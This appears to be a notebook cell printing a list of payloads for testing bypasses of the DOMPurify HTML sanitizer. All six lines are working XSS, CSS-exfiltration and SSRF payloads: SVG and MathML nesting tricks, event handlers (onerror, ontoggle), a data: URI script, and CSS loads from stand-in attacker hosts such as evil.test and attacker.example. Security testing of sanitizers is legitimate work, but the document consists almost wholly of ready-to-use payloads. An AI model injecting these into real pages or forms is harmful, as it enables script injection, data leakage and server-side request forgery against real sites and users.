# %%
# DOMPurify bypass test payloads
# Out:
# <svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="300" height="200"><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="console.log("XSS-1-FOREIGNOBJECT")" id="xss1"></div></foreignObject><rect width="300" height="200" fill="red"/></svg>
# <svg><svg><style>*{background-image:url(//evil.test/css-leak)}</style><circle r="50" fill="red"/></svg></svg>
# <svg><filter id="x"><feImage href="http://127.0.0.1:8080/ssrf-test"/></filter><rect filter="url(#x)" width="300" height="200"/></svg>
# <math><mtext><svg><style>@import url(//attacker.example/css)</style></svg></mtext></math>
# <details open ontoggle="alert(1)"><summary>Click for XSS</summary>Test</details>
# <svg><set attributeName="href" to="data:text/html,<script>alert(2)</script>"/><animate attributeName="href" values="#" dur="1s"/></svg>
